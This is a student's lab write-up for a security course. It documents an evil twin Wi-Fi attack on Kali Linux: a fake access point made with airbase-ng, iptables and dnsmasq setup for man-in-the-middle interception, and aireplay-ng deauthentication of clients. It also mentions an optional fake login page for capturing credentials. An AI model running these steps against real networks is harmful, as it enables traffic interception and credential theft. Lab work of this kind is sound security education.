# Airbase-NG: Evil Twin Attack (Kali VMware)

> CIT 53200 | Lab 4 | Benjamin Rader
> 

# Links Used During Lab

- [https://thecybersecurityman.com/2018/08/11/creating-an-evil-twin-or-fake-access-point-using-aircrack-ng-and-dnsmasq-part-2-the-attack/](https://thecybersecurityman.com/2018/08/11/creating-an-evil-twin-or-fake-access-point-using-aircrack-ng-and-dnsmasq-part-2-the-attack/)
- [https://charlesreid1.com/wiki/Evil_Twin/Setup](https://charlesreid1.com/wiki/Evil_Twin/Setup)
- [https://www.geeksforgeeks.org/evil-twin-in-kali-linux/](https://www.geeksforgeeks.org/evil-twin-in-kali-linux/)
- [https://medium.com/gotta-hack-em-all/kick-any-client-out-of-its-own-wifi-50cd53333b1c](https://medium.com/gotta-hack-em-all/kick-any-client-out-of-its-own-wifi-50cd53333b1c)

# Fake AP Setup

- Make sure you have Kali (kali.org) on VMware workstation player (works better for Wi-Fi pentesting than VirtualBox)

## Locating target network:

- **`apt-get update && apt-get upgrade` - always run this before doing stuff in Kali**
- `iwconfig`
- `airmon-ng start wlan0`
- `airmon-ng check kill`
- **`airodump-ng wlan0mon`**
    
    ![Untitled](Airbase-NG%20Evil%20Twin%20Attack%20(Kali%20VMware)/Untitled.png)
    

## Setting up Fake AP (Evil Twin) with Airbase-ng:

- `airbase-ng -e “WIFI_AP_NAME” -c 11 wlan0mon`
    
    ![Untitled](Airbase-NG%20Evil%20Twin%20Attack%20(Kali%20VMware)/Untitled%201.png)
    

### Setting up Fake AP Interface for MITM

In order to actually MITM connections, we need the victims to be able to reach the internet. We will use `iptables` to set this up. 

- Commands:
    
    ```
    ifconfig at0 up
    ifconfig at0 10.0.0.1 netmask 255.255.255.0
    route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
    iptables -P FORWARD ACCEPT
    iptables -t nat -A POSTROUTING -o wlan0mon -j MASQUERADE
    echo 1 > /proc/sys/net/ipv4/ip_forward
    ```
    

### Fake AP from Phone’s View

Using “hostapd” - you can add the security scheme and match it to the “good” AP, so that it’s most convincing.

![Screenshot.png](Airbase-NG%20Evil%20Twin%20Attack%20(Kali%20VMware)/Screenshot.png)

## Install & Run dnsmasq:

This is how we will setup our DHCP server.

- **`apt-get install dnsmasq`**
- **`dnsmasq -C Desktop/eviltwin/dnsmasq.conf -d`**
- **`nano /etc/dnsmasq.conf` -** use this to get a feel for the configuration file for the DHCP server.
- `cd Desktop`
- `mkdir eviltwin`
- `nano evil_dnsmasq.conf`
    
    ```
    # Configuration file for dnsmasq.
    interface=at0
    dhcp-range=10.0.0.20,10.0.0.250,255.255.255.0,12h
    dhcp-option=3,10.0.0.1
    dhcp-option=6,10.0.0.1
    server=8.8.8.8
    server=8.8.4.4
    server=64.6.64.6
    server=64.6.65.6
    log-queries
    log-dhcp
    listen-address=127.0.0.1
    ```
    
- `dnsmasq -C Desktop/eviltwin/evil_dnsmasq.conf -d` - start the DHCP server using the evil configuration.
    
    ![Untitled](Airbase-NG%20Evil%20Twin%20Attack%20(Kali%20VMware)/Untitled%202.png)
    

## Increase the Strength of the AP

- You can increase the strength of the access point by changing the power
- **`iwconfig wlan0mon txpower 27` ←** don’t go higher than 27 (or it’s illegal)

<aside>
‼️ LEGAL WARNING:  DON’T GO HIGHER THAN **27** dBm or 500 milliwatts; any higher is illegal in the U.S.

</aside>

## Deauth (kick off) clients from the “good” AP

We need to kick people off of the good AP so that they can use our evil AP 😈

- **`aireplay-ng –-deauth 50 -a *[BSSID of real AP]* wlan0mon` -** sends 50 802.11 deauth frames onto our good AP network.
- HOPE THEY CONNECT to the evil AP
- Isn’t booting off my phone for some reason
    
    ![Untitled](Airbase-NG%20Evil%20Twin%20Attack%20(Kali%20VMware)/Untitled%203.png)
    

## Error: aireplay-ng on wrong channel

![Untitled](Airbase-NG%20Evil%20Twin%20Attack%20(Kali%20VMware)/Untitled%204.png)

### Checked Channels of networks on phone too using “Fing”

![Screenshot_20221112-153332.png](Airbase-NG%20Evil%20Twin%20Attack%20(Kali%20VMware)/Screenshot_20221112-153332.png)

### Change the channel of the card with airmon-ng

- `airmon-ng stop wlan0mon`
- `airmon-ng start wlan0 6`
- or change the channel while it’s on - `iwconfig <interface> channel <channel>`

## Deauth wouldn’t work

I spent a good 6 hours on this, so I’m going to move on and try this next time with different adapters.

Some potential issues that can affect process:

- Kali version
- How the DHCP server is setup
- 5 vs 2.4 GHz?
- Auto reconnect on devices

# Results (Report)

## Problem

- The problem was to create a fake access point
- Doing so requires multiple steps
    - Kali Linux
    - WiFi adapter that can do MONITOR mode in Kali
    - aircrack-ng library installed in Kali
    - a fake DHCP server set up in Kali using a combination of utilities in Kali like
        - iptables, hostapd, dnsmasq, etc.
    - Airbase-ng to actually run the fake AP
    - Way to get client MACs if possible
    - Likely need to be associated with the Wi-fi network to make things easier
    - Aireplay-ng to deauthenticate clients from the good AP, so that they connect to the bad AP
    - Optionally, a fake Wi-fi login to get credentials from people

## Analysis

- This attack will especially not work if you don’t give the clients an internet connection
    
    ![Screenshot_20221112-154259.png](Airbase-NG%20Evil%20Twin%20Attack%20(Kali%20VMware)/Screenshot_20221112-154259.png)
    

## Recommendations

- One way to counter if is to use the setting of “never connect to unfamiliar networks”

## Muddiest point in the lab

- No matter what I tried with aireplay-ng for deauths, it never worked for my network. I even targeted the client by looking at the randomized MAC address it used with the good AP, but to no avail. It also can’t be the adapter because I wasn’t getting those types of errors. It also had nothing to do with the DHCP server. I’m not sure why I couldn’t deauth my phone.
    
    ![Untitled](Airbase-NG%20Evil%20Twin%20Attack%20(Kali%20VMware)/Untitled%205.png)
    
- Also, some of the commands are outdated on lots of websites so things like setting up DHCP, hostapd, dnsmasq, and any other specific utility made for this process sometimes doesn’t work together well with the other tools.
- Deauths was the muddiest part of the lab for me, and I didn’t really have time to try setting up a security scheme or get the routing working for giving clients an actual internet connection.